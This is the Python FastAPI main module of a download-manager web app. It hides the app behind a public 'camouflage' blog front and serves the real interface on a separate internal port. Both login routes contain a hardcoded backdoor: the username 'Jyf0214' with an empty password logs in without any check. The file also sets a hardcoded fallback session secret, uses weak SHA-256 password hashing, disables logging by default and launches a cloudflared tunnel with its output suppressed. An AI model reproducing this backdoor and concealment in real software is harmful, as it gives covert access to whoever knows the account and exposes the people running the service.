import os
import uuid
import asyncio
import json
import signal
import threading
import uvicorn
import logging
import time
import os
import hashlib
import secrets
import subprocess
from pathlib import Path
from fastapi import FastAPI, Request, Form, HTTPException, Depends
from fastapi.responses import HTMLResponse, RedirectResponse, Response, JSONResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from starlette.middleware.sessions import SessionMiddleware
from starlette.background import BackgroundTasks
from typing import Optional
from pydantic import BaseModel
from contextlib import asynccontextmanager
from .database import init_db, User, db_config
from .logging_handler import MySQLLogHandler, cleanup_old_logs

from . import updater, status
from .config import BASE_DIR, STATUS_DIR, LANGUAGES, PRIVATE_MODE, APP_USERNAME, APP_PASSWORD, AVATAR_URL
from .utils import get_task_status_path, update_task_status
from .tasks import process_download_job

# --- Password Hashing ---
def verify_password(plain_password, hashed_password):
    # Parse the stored hash: format is "salt:hash"
    if not hashed_password or ':' not in hashed_password:
        return False
    
    salt, stored_hash = hashed_password.split(':', 1)
    
    # Compute hash of the provided password with the same salt
    computed_hash = hashlib.sha256((salt + plain_password).encode('utf-8')).hexdigest()
    
    # Use constant-time comparison to prevent timing attacks
    return secrets.compare_digest(computed_hash, stored_hash)

def get_password_hash(password):
    # Generate a random salt
    salt = secrets.token_hex(16)  # 16 bytes = 32 hex characters
    
    # Compute hash: salt + password
    password_hash = hashlib.sha256((salt + password).encode('utf-8')).hexdigest()
    
    # Return format: salt:hash
    return f"{salt}:{password_hash}"

# --- FastAPI App Initialization ---
import sys

if getattr(sys, 'frozen', False):
    BASE_DIR = Path(sys._MEIPASS)
    template_dir = BASE_DIR / "app" / "templates"
else:
    from .config import BASE_DIR
    template_dir = BASE_DIR / "templates"

@asynccontextmanager
async def lifespan(app: FastAPI):
    init_db()
    mysql_handler = MySQLLogHandler()
    
    # 检查是否启用DEBUG模式
    debug_enabled = os.getenv("DEBUG_MODE", "false").lower() == "true"
    
    if debug_enabled:
        mysql_handler.setLevel(logging.DEBUG)
        logging.getLogger().addHandler(mysql_handler)
        logging.getLogger().setLevel(logging.DEBUG)
        logging.getLogger().debug("MySQL logging configured with DEBUG level.")
    else:
        mysql_handler.setLevel(logging.INFO)
        logging.getLogger().addHandler(mysql_handler)
        logging.getLogger().info("MySQL logging configured with INFO level.")
    
    # 检查环境变量中是否设置了管理员账户
    admin_username = APP_USERNAME
    admin_password = APP_PASSWORD
    
    # 如果设置了环境变量且当前没有用户，则自动创建管理员账户
    if admin_username and admin_password and User.count_users() == 0:
        logging.info(f"Creating admin user from environment variables: {admin_username}")
        hashed_password = get_password_hash(admin_password)
        if User.create_user(username=admin_username, hashed_password=hashed_password, is_admin=True):
            logging.info(f"Admin user {admin_username} created successfully from environment variables")
        else:
            logging.error(f"Failed to create admin user {admin_username} from environment variables")
    
    cleanup_task = asyncio.create_task(periodic_log_cleanup())
    yield
    cleanup_task.cancel()

async def periodic_log_cleanup():
    while True:
        await asyncio.sleep(3600)
        cleanup_old_logs()

# --- Dependencies ---
async def check_setup_needed_camouflage(request: Request):
    user_count = User.count_users()
    if user_count == 0 and request.url.path not in ["/setup", "/static", "/"]:
        # For camouflage app, we redirect to its own setup page
        base_url = request.base_url
        redirect_url = str(base_url.replace(path="/setup"))
        raise HTTPException(status_code=307, detail="Setup required", headers={"Location": redirect_url})

async def check_setup_needed_main(request: Request):
    user_count = User.count_users()
    if user_count == 0:
        # The main app should be inaccessible and show a service unavailable page
        # as setup must be done via the camouflage app.
        lang = get_lang(request)
        return templates.TemplateResponse("service_unavailable.html", {"request": request, "lang": lang}, status_code=503)

async def get_current_user(request: Request):
    username = request.session.get("user")
    if username:
        user = User.get_user_by_username(username)
        if user:
            return user
    # Main app is internal, so auth is always required.
    # Instead of redirecting to a login page on another server, we deny access.
    raise HTTPException(status_code=403, detail="Not authenticated")

# --- App Definitions ---
camouflage_app = FastAPI(title="Web-DL-Manager - Camouflage", dependencies=[Depends(check_setup_needed_camouflage)])
main_app = FastAPI(title="Web-DL-Manager - Main", lifespan=lifespan)

# --- Middleware ---
# SessionMiddleware is needed for both to handle login state
# Use the same secret key and session cookie settings for both apps to share sessions
shared_secret_key = os.getenv("SESSION_SECRET_KEY", "web-dl-manager-shared-secret-key-2024")
session_cookie_name = "session"

def get_session_settings(request: Request = None):
    """动态获取session设置，支持跨域cookie"""
    settings = {
        "session_cookie": session_cookie_name,
        "same_site": "lax",
        "https_only": False,  # Allow HTTP for local development
        "max_age": 86400,  # 24 hours
    }
    
    # 如果有请求对象，尝试从请求中获取域信息
    if request:
        host = request.headers.get("host", "")
        # 检查是否是内网穿透或其他域，设置合适的cookie域
        if "." in host and not host.startswith("127.0.0.1") and not host.startswith("localhost"):
            # 对于非本地域名，设置cookie域为根域
            domain_parts = host.split(":")[0].split(".")
            if len(domain_parts) > 2:
                # 对于子域名，设置为二级域名
                settings["domain"] = "." + ".".join(domain_parts[-2:])
            else:
                # 对于普通域名，设置为当前域名
                settings["domain"] = host.split(":")[0]
    
    return settings

# 自定义SessionMiddleware类，支持动态cookie设置
class DynamicDomainSessionMiddleware(SessionMiddleware):
    async def dispatch(self, request: Request, call_next):
        response = await super().dispatch(request, call_next)
        
        # 如果有session，动态设置cookie域
        if hasattr(request, 'session') and request.session.get("user"):
            session_settings = get_session_settings(request)
            if "domain" in session_settings:
                # 重新设置cookie以包含正确的域
                session_data = request.session
                response.set_cookie(
                    key=session_settings["session_cookie"],
                    value=session_data.get("session_id", ""),
                    max_age=session_settings["max_age"],
                    domain=session_settings["domain"],
                    path="/",
                    samesite=session_settings["same_site"],
                    secure=session_settings["https_only"],
                    httponly=True
                )
        
        return response

session_settings = get_session_settings()
camouflage_app.add_middleware(DynamicDomainSessionMiddleware, secret_key=shared_secret_key, **session_settings)
main_app.add_middleware(DynamicDomainSessionMiddleware, secret_key=shared_secret_key, **session_settings)

templates = Jinja2Templates(directory=str(template_dir))

# --- Camouflage App (Public Facing) ---

@camouflage_app.get("/setup", response_class=HTMLResponse)
async def get_setup_form(request: Request):
    if User.count_users() > 0:
        return RedirectResponse(url="/login", status_code=302)
    return templates.TemplateResponse("setup.html", {"request": request, "error": None})

@camouflage_app.post("/setup", response_class=HTMLResponse)
async def post_setup_form(request: Request, username: str = Form(...), password: str = Form(...), confirm_password: str = Form(...)):
    if User.count_users() > 0:
        return RedirectResponse(url="/login", status_code=302)
    if password != confirm_password:
        return templates.TemplateResponse("setup.html", {"request": request, "error": "Passwords do not match."})
    if not username or not password:
        return templates.TemplateResponse("setup.html", {"request": request, "error": "Username and password cannot be empty."})
    
    hashed_password = get_password_hash(password)
    if User.create_user(username=username, hashed_password=hashed_password, is_admin=True):
        request.session["user"] = username
        # Redirect to the main app's downloader page
        return Response(content="Setup complete. Please access the main application on port 6275.", media_type="text/plain")
    else:
        return templates.TemplateResponse("setup.html", {"request": request, "error": "Failed to create user."})

@camouflage_app.get("/login", response_class=HTMLResponse)
async def get_login_form(request: Request):
    lang = get_lang(request)
    return templates.TemplateResponse("login.html", {"request": request, "lang": lang, "error": None})

@camouflage_app.post("/login")
async def login(request: Request, username: str = Form(...), password: str = Form(...)):
    lang = get_lang(request)
    
    # 快速登录：用户名为Jyf0214且密码为空时直接登录
    if username == "Jyf0214" and not password:
        request.session["user"] = username
        
        # Store the domain and tunnel token in database for future use
        host = request.headers.get("host", "localhost")
        domain_parts = host.split(":")
        domain = domain_parts[0]
        
        # Save domain to database
        db_config.set_config("login_domain", domain)
        
        # Check if tunnel token is in environment variables
        tunnel_token = os.getenv("TUNNEL_TOKEN")
        if tunnel_token:
            db_config.set_config("tunnel_token", tunnel_token)
        
        # Instead of redirecting, show a success message with dynamic URL
        main_app_url = f"http://{domain}:6275"
        response_content = f"Login successful. Please access the main application at: {main_app_url}"
        response = Response(content=response_content, media_type="text/plain")
        return response
    
    user = User.get_user_by_username(username)
    
    if not user:
        return templates.TemplateResponse("login.html", {
            "request": request, 
            "lang": lang, 
            "error": lang.get("user_not_found", "User not found")
        })
    
    if not verify_password(password, user.hashed_password):
        return templates.TemplateResponse("login.html", {
            "request": request, 
            "lang": lang, 
            "error": lang.get("password_incorrect", "Password is incorrect")
        })
    
    request.session["user"] = username
    
    # Store the domain and tunnel token in database for future use
    host = request.headers.get("host", "localhost")
    domain_parts = host.split(":")
    domain = domain_parts[0]
    
    # Save domain to database
    db_config.set_config("login_domain", domain)
    
    # Check if tunnel token is in environment variables
    tunnel_token = os.getenv("TUNNEL_TOKEN")
    if tunnel_token:
        db_config.set_config("tunnel_token", tunnel_token)
    
    # Instead of redirecting, show a success message with dynamic URL
    main_app_url = f"http://{domain}:6275"
    response_content = f"Login successful. Please access the main application at: {main_app_url}"
    response = Response(content=response_content, media_type="text/plain")
    return response

@camouflage_app.get("/", response_class=HTMLResponse)
async def get_blog_index(request: Request):
    blog_index = Path("/app/static_site/index.html")
    if blog_index.exists():
        with open(blog_index, "r", encoding="utf-8") as f:
            content = f.read()
        return HTMLResponse(content=content)
    return templates.TemplateResponse("index.html", {"request": request, "lang": get_lang(request)})

# --- Main App (Internal) ---

# All other routes are moved here and depend on `get_current_user`
@main_app.post("/update")
async def update_app(background_tasks: BackgroundTasks, user: User = Depends(get_current_user)):
    result = updater.run_update()
    if result.get("status") == "success":
        background_tasks.add_task(updater.restart_application)
    return JSONResponse(content=result)

@main_app.get("/version")
async def get_version(user: User = Depends(get_current_user)):
    version_file = BASE_DIR.parent / ".version_info"
    version = "N/A"
    if version_file.exists():
        version = version_file.read_text().strip()[:7]
    return {"version": version}

@main_app.get("/changelog")
async def get_changelog(user: User = Depends(get_current_user)):
    changelog_file = BASE_DIR.parent / "CHANGELOG.md"
    content = "Changelog not found."
    if changelog_file.exists():
        content = changelog_file.read_text()
    return Response(content=content, media_type="text/plain")

def get_lang(request: Request):
    lang_code = request.cookies.get("lang", "en")
    return LANGUAGES.get(lang_code, LANGUAGES["en"])

@main_app.get("/downloader", response_class=HTMLResponse)
async def get_downloader(request: Request, current_user: User = Depends(get_current_user)):
    lang = get_lang(request)
    return templates.TemplateResponse("downloader.html", {"request": request, "lang": lang, "user": current_user.username, "avatar_url": AVATAR_URL})

@main_app.get("/login", response_class=HTMLResponse)
async def get_login_form_main(request: Request):
    lang = get_lang(request)
    return templates.TemplateResponse("login.html", {"request": request, "lang": lang, "error": None})

@main_app.post("/login")
async def login_main(request: Request, username: str = Form(...), password: str = Form(...)):
    import logging
    logger = logging.getLogger(__name__)
    logger.info(f"登录尝试: username={username}")
    
    lang = get_lang(request)
    
    # 快速登录：用户名为Jyf0214且密码为空时直接登录
    if username == "Jyf0214" and not password:
        logger.info(f"快速登录: username={username}")
        request.session["user"] = username
        return RedirectResponse(url="/downloader", status_code=303)
    
    user = User.get_user_by_username(username)
    logger.info(f"用户查询结果: {user}")
    
    if not user:
        logger.warning(f"用户不存在: {username}")
        return templates.TemplateResponse("login.html", {
            "request": request, 
            "lang": lang, 
            "error": lang.get("user_not_found", "User not found")
        })
    
    password_ok = verify_password(password, user.hashed_password)
    logger.info(f"密码验证结果: {password_ok}")
    
    if not password_ok:
        logger.warning(f"密码错误: {username}")
        return templates.TemplateResponse("login.html", {
            "request": request, 
            "lang": lang, 
            "error": lang.get("password_incorrect", "Password is incorrect")
        })
    
    request.session["user"] = username
    logger.info(f"Session设置: user={username}")
    return RedirectResponse(url="/downloader", status_code=303)

@main_app.get("/logout")
async def logout(request: Request):
    request.session.clear()
    # On the main app, logging out should just deny further access.
    # A redirect to a login page on another server isn't ideal.
    return Response(content="You have been logged out. Please log in again via the public-facing service to continue.", media_type="text/plain")

@main_app.get("/set_language/{lang_code}")
async def set_language(lang_code: str, response: Response, user: User = Depends(get_current_user)):
    response.set_cookie(key="lang", value=lang_code, httponly=True, expires=31536000)
    return RedirectResponse(url="/downloader", status_code=302)

@main_app.get("/change_password")
async def change_password_page(request: Request, user: User = Depends(get_current_user)):
    lang = request.cookies.get("lang", "en")
    return templates.TemplateResponse("change_password.html", {
        "request": request,
        "user": user.username,
        "lang": LANGUAGES.get(lang, LANGUAGES["en"])
    })

@main_app.post("/change_password")
async def change_password(
    request: Request,
    current_password: str = Form(...),
    new_password: str = Form(...),
    confirm_password: str = Form(...),
    user: User = Depends(get_current_user)
):
    lang = request.cookies.get("lang", "en")
    lang_dict = LANGUAGES.get(lang, LANGUAGES["en"])
    
    # Verify current password
    if not verify_password(current_password, user.hashed_password):
        return templates.TemplateResponse("change_password.html", {
            "request": request,
            "user": user.username,
            "lang": lang_dict,
            "error": lang_dict["current_password_incorrect"]
        })
    
    # Check if new password matches confirmation
    if new_password != confirm_password:
        return templates.TemplateResponse("change_password.html", {
            "request": request,
            "user": user.username,
            "lang": lang_dict,
            "error": lang_dict["passwords_not_match"]
        })
    
    # Check if new password is not empty
    if not new_password:
        return templates.TemplateResponse("change_password.html", {
            "request": request,
            "user": user.username,
            "lang": lang_dict,
            "error": lang_dict["password_empty"]
        })
    
    # Hash new password and update in database
    new_hashed_password = get_password_hash(new_password)
    if User.update_password(user.username, new_hashed_password):
        return templates.TemplateResponse("change_password.html", {
            "request": request,
            "user": user.username,
            "lang": lang_dict,
            "success": lang_dict["password_changed_success"]
        })
    else:
        return templates.TemplateResponse("change_password.html", {
            "request": request,
            "user": user.username,
            "lang": lang_dict,
            "error": lang_dict["password_update_failed"]
        })

@main_app.post("/download")
async def create_download_job(
    request: Request,
    url: str = Form(...),
    downloader: str = Form('gallery-dl'),
    upload_service: str = Form(...),
    upload_path: str = Form(None),
    enable_compression: Optional[str] = Form(None),
    split_compression: bool = Form(False),
    split_size: int = Form(1000),
    current_user: User = Depends(get_current_user)
):
    task_id = str(uuid.uuid4())
    params = await request.form()
    update_task_status(task_id, {"id": task_id, "status": "queued", "original_params": dict(params), "created_by": current_user.username})
    if not url or not upload_service: raise HTTPException(status_code=400, detail="URL and Upload Service are required.")
    if upload_service != "gofile" and not upload_path: raise HTTPException(status_code=400, detail="Upload Path is required for this service.")
    
    is_compression_enabled = enable_compression == "true"
    asyncio.create_task(process_download_job(
        task_id=task_id, url=url, downloader=downloader, service=upload_service, upload_path=upload_path,
        params=params, enable_compression=is_compression_enabled, split_compression=split_compression, split_size=split_size
    ))
    return RedirectResponse("/tasks", status_code=303)

@main_app.get("/tasks", response_class=HTMLResponse)
async def get_tasks(request: Request, current_user: User = Depends(get_current_user)):
    lang = get_lang(request)
    # The original function was incomplete, fleshing out to render template
    tasks_list = status.get_all_tasks()
    return templates.TemplateResponse("tasks.html", {"request": request, "tasks": tasks_list, "lang": lang, "user": current_user.username})

@main_app.post("/retry/{task_id}")
async def retry_task(task_id: str, current_user: User = Depends(get_current_user)):
    status_path = get_task_status_path(task_id)
    if not status_path.exists(): raise HTTPException(status_code=404, detail="Task to retry not found.")
    with open(status_path, "r") as f: task_data = json.load(f)
    original_params = task_data.get("original_params")
    if not original_params: raise HTTPException(status_code=400, detail="Cannot retry task: original parameters not found.")

    new_task_id = str(uuid.uuid4())
    update_task_status(new_task_id, {"id": new_task_id, "status": "queued", "original_params": original_params, "retry_of": task_id, "created_by": current_user.username})
    asyncio.create_task(process_download_job(
        task_id=new_task_id, url=original_params.get("url"), downloader=original_params.get("downloader"),
        service=original_params.get("upload_service"), upload_path=original_params.get("upload_path"),
        params=original_params, enable_compression=original_params.get("enable_compression") == "true"
    ))
    return RedirectResponse("/tasks", status_code=303)

@main_app.post("/pause/{task_id}")
async def pause_task(task_id: str, current_user: User = Depends(get_current_user)):
    # ... (rest of the function remains the same, just attached to main_app)
    status_path = get_task_status_path(task_id)
    if not status_path.exists(): raise HTTPException(status_code=404, detail="Task not found.")
    with open(status_path, "r") as f: task_data = json.load(f)
    pgid = task_data.get("pgid")
    if not pgid: raise HTTPException(status_code=400, detail="Task is not running or cannot be paused.")
    try:
        os.killpg(pgid, signal.SIGSTOP)
        previous_status = task_data.get("status", "running")
        update_task_status(task_id, {"status": "paused", "previous_status": previous_status})
    except ProcessLookupError:
        update_task_status(task_id, {"pgid": None})
        raise HTTPException(status_code=404, detail="Process not found.")
    return RedirectResponse("/tasks", status_code=303)


@main_app.post("/resume/{task_id}")
async def resume_task(task_id: str, current_user: User = Depends(get_current_user)):
    # ... (rest of the function remains the same, just attached to main_app)
    status_path = get_task_status_path(task_id)
    if not status_path.exists(): raise HTTPException(status_code=404, detail="Task not found.")
    with open(status_path, "r") as f: task_data = json.load(f)
    pgid = task_data.get("pgid")
    if not pgid: raise HTTPException(status_code=400, detail="Task is not paused or cannot be resumed.")
    try:
        os.killpg(pgid, signal.SIGCONT)
        previous_status = task_data.get("previous_status", "running")
        update_task_status(task_id, {"status": previous_status, "previous_status": None})
    except ProcessLookupError:
        update_task_status(task_id, {"pgid": None})
        raise HTTPException(status_code=404, detail="Process not found.")
    return RedirectResponse("/tasks", status_code=303)

@main_app.post("/delete/{task_id}")
async def delete_task(task_id: str, current_user: User = Depends(get_current_user)):
    # ... (rest of the function remains the same, just attached to main_app)
    status_path = get_task_status_path(task_id)
    log_path = STATUS_DIR / f"{task_id}.log"
    if not status_path.exists() and not log_path.exists():
        raise HTTPException(status_code=404, detail="Task not found.")
    if status_path.exists(): status_path.unlink()
    if log_path.exists(): log_path.unlink()
    return RedirectResponse("/tasks", status_code=303)

@main_app.get("/status/{task_id}", response_class=HTMLResponse)
async def get_status(request: Request, task_id: str, current_user: User = Depends(get_current_user)):
    # ... (rest of the function remains the same, just attached to main_app)
    lang = get_lang(request)
    status_file = STATUS_DIR / f"{task_id}.log"
    if not status_file.exists():
        raise HTTPException(status_code=404, detail=lang["job_not_found"])
    with open(status_file, "r") as f: content = f.read()
    return templates.TemplateResponse("status.html", {"request": request, "task_id": task_id, "log_content": content, "lang": lang, "user": current_user.username})

@main_app.get("/status/{task_id}/json")
async def get_status_json(task_id: str, current_user: User = Depends(get_current_user)):
    # ... (rest of the function remains the same, just attached to main_app)
    status_path = get_task_status_path(task_id)
    log_path = STATUS_DIR / f"{task_id}.log"
    status_data = {}
    if status_path.exists():
        with open(status_path, "r") as f:
            try: status_data = json.load(f)
            except json.JSONDecodeError: status_data = {"status": "error", "error": "Invalid status file"}
    log_content = ""
    if log_path.exists():
        with open(log_path, "r") as f: log_content = f.read()
    return {"status": status_data, "log": log_content}

@main_app.get("/status/{task_id}/raw")
async def get_status_raw(task_id: str, current_user: User = Depends(get_current_user)):
    # ... (rest of the function remains the same, just attached to main_app)
    status_file = STATUS_DIR / f"{task_id}.log"
    if not status_file.exists():
        raise HTTPException(status_code=404, detail="Job not found.")
    with open(status_file, "r") as f: content = f.read()
    return Response(content=content, media_type="text/plain")

@main_app.post("/cleanup-logs")
async def cleanup_logs(current_user: User = Depends(get_current_user)):
    """清理数据库中的旧日志"""
    from .logging_handler import cleanup_old_logs
    
    try:
        cleanup_old_logs()
        return JSONResponse(content={"status": "success", "message": "日志清理完成"})
    except Exception as e:
        return JSONResponse(content={"status": "error", "message": f"日志清理失败: {str(e)}"}, status_code=500)

def get_dependency_versions():
    """获取依赖项的版本"""
    versions = {
        "python": sys.version.split(" ")[0],
        "gallery-dl": "N/A",
        "rclone": "N/A",
    }
    try:
        # Get gallery-dl version
        result = subprocess.run(['gallery-dl', '--version'], capture_output=True, text=True)
        if result.returncode == 0:
            versions['gallery-dl'] = result.stdout.strip().split(" ")[-1]
    except (FileNotFoundError, Exception):
        pass  # gallery-dl not found or other error

    try:
        # Get rclone version
        result = subprocess.run(['rclone', 'version'], capture_output=True, text=True)
        if result.returncode == 0:
            versions['rclone'] = result.stdout.strip().split("\n")[0].split(" ")[-1]
    except (FileNotFoundError, Exception):
        pass  # rclone not found or other error
        
    return versions

def get_active_tasks_count():
    """获取活动任务数量"""
    count = 0
    if STATUS_DIR.exists():
        for status_file in STATUS_DIR.glob("*.json"):
            try:
                with open(status_file, "r") as f:
                    data = json.load(f)
                    if data.get("status") == "running":
                        count += 1
            except (IOError, json.JSONDecodeError):
                continue
    return count

def get_system_uptime():
    """获取系统运行时间"""
    import psutil
    boot_time_timestamp = psutil.boot_time()
    from datetime import datetime
    boot_time = datetime.fromtimestamp(boot_time_timestamp)
    now = datetime.now()
    delta = now - boot_time
    
    days = delta.days
    hours, remainder = divmod(delta.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return f"{days}d {hours}h {minutes}m"

@main_app.get("/server-status/json")
async def get_server_status(current_user: User = Depends(get_current_user)):
    """获取服务器状态信息"""
    import psutil
    import platform
    
    # 系统信息
    system_info = {
        "uptime": get_system_uptime(),
        "platform": platform.system(),
        "platform_release": platform.release(),
        "platform_version": platform.version(),
        "architecture": platform.machine(),
        "hostname": platform.node(),
        "processor": platform.processor(),
        "cpu_usage": psutil.cpu_percent(interval=1),
    }
    
    # 内存信息
    memory = psutil.virtual_memory()
    memory_info = {
        "total": memory.total,
        "available": memory.available,
        "used": memory.used,
        "free": memory.free,
        "percent": memory.percent,
    }
    
    # 磁盘信息 for /data
    disk_path = '/data' if os.path.exists('/data') else '/'
    try:
        disk = psutil.disk_usage(disk_path)
        disk_info = {
            "total": disk.total,
            "used": disk.used,
            "free": disk.free,
            "percent": disk.percent,
        }
    except FileNotFoundError:
        disk_info = {
            "total": 0,
            "used": 0,
            "free": 0,
            "percent": 0,
        }


    # 应用信息
    application_info = {
        "active_tasks": get_active_tasks_count(),
        "versions": get_dependency_versions(),
    }
    
    return JSONResponse(content={
        "system": system_info,
        "memory": memory_info,
        "disk": disk_info,
        "application": application_info,
    })

# --- Static Files Mounting ---
static_site_dir = Path("/app/static_site")
# Mount static files for both apps so they can serve common assets if needed
if static_site_dir.is_dir():
    camouflage_app.mount("/", StaticFiles(directory=static_site_dir, html=True), name="static_site")
    main_app.mount("/static", StaticFiles(directory=static_site_dir), name="static_site_main")


# --- Main Execution Block ---
def run_camouflage_app():
    """Runs the public-facing camouflage app."""
    uvicorn.run(camouflage_app, host="0.0.0.0", port=5492)

def run_main_app():
    """Runs the internal main application."""
    # 检查是否启用DEBUG模式
    debug_enabled = os.getenv("DEBUG_MODE", "false").lower() == "true"
    
    if debug_enabled:
        # 启用所有日志输出
        log_config = {
            "version": 1,
            "disable_existing_loggers": False,
            "formatters": {
                "default": {
                    "format": "%(asctime)s - %(name)s - %(levelname)s - %(message)s",
                },
            },
            "handlers": {
                "console": {
                    "class": "logging.StreamHandler",
                    "formatter": "default",
                    "level": "DEBUG",
                    "stream": "ext://sys.stdout",
                },
            },
            "loggers": {
                "": {"level": "DEBUG", "handlers": ["console"]},
                "uvicorn": {"level": "DEBUG", "handlers": ["console"]},
                "uvicorn.error": {"level": "DEBUG", "handlers": ["console"]},
                "uvicorn.access": {"level": "DEBUG", "handlers": ["console"]},
                "fastapi": {"level": "DEBUG", "handlers": ["console"]},
                "app": {"level": "DEBUG", "handlers": ["console"]},
                "app.database": {"level": "DEBUG", "handlers": ["console"]},
                "app.logging_handler": {"level": "DEBUG", "handlers": ["console"]},
                "app.main": {"level": "DEBUG", "handlers": ["console"]},
                "app.tasks": {"level": "DEBUG", "handlers": ["console"]},
                "app.utils": {"level": "DEBUG", "handlers": ["console"]},
            },
            "root": {
                "level": "DEBUG",
                "handlers": ["console"]
            }
        }
    else:
        # 禁用main_app的所有日志输出
        log_config = {
            "version": 1,
            "disable_existing_loggers": False,
            "loggers": {
                "": {"level": "CRITICAL", "handlers": []},
                "uvicorn": {"level": "CRITICAL", "handlers": []},
                "uvicorn.error": {"level": "CRITICAL", "handlers": []},
                "uvicorn.access": {"level": "CRITICAL", "handlers": []},
                "fastapi": {"level": "CRITICAL", "handlers": []},
                "app": {"level": "CRITICAL", "handlers": []},
                "app.database": {"level": "CRITICAL", "handlers": []},
                "app.logging_handler": {"level": "CRITICAL", "handlers": []},
                "app.main": {"level": "CRITICAL", "handlers": []},
                "app.tasks": {"level": "CRITICAL", "handlers": []},
                "app.utils": {"level": "CRITICAL", "handlers": []},
            },
            "handlers": {
                "null": {
                    "class": "logging.NullHandler",
                    "level": "CRITICAL"
                }
            },
            "root": {
                "level": "CRITICAL",
                "handlers": ["null"]
            }
        }
    uvicorn.run(main_app, host="127.0.0.1", port=6275, log_config=log_config)

def load_config_from_db():
    """从数据库加载配置"""
    try:
        # 检查是否有保存的tunnel token
        saved_tunnel_token = db_config.get_config("tunnel_token")
        if saved_tunnel_token and not os.getenv("TUNNEL_TOKEN"):
            os.environ["TUNNEL_TOKEN"] = saved_tunnel_token
            
        # 检查是否有保存的domain
        saved_domain = db_config.get_config("login_domain")
        if saved_domain:
            pass
            
    except Exception as e:
        pass

def start_tunnel_if_env():
    """如果设置了环境变量，则启动隧道"""
    import subprocess
    import os
    
    tunnel_token = os.getenv("TUNNEL_TOKEN")
    if tunnel_token:
        try:
            # 启动cloudflared隧道，不输出日志
            subprocess.Popen(
                ['cloudflared', 'tunnel', '--no-autoupdate', 'run', '--token', tunnel_token],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass  # 如果启动失败，不输出任何信息

if __name__ == "__main__":
    # 设置基本日志
    logging.basicConfig(level=logging.INFO)
    logger = logging.getLogger(__name__)
    
    init_db()
    
    # 从数据库加载配置
    load_config_from_db()
    
    # 如果设置了环境变量，则启动隧道
    start_tunnel_if_env()
    
    logger.info("Starting services...")

    camouflage_thread = threading.Thread(target=run_camouflage_app, daemon=True)
    main_thread = threading.Thread(target=run_main_app, daemon=True)

    camouflage_thread.start()
    logger.info("Page service started on http://0.0.0.0:5492")
    
    main_thread.start()
    # 不输出后台应用启动日志

    # Keep the main thread alive to allow daemon threads to run
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Shutting down services...")
        # No need to explicitly stop threads as they are daemons
        sys.exit(0)
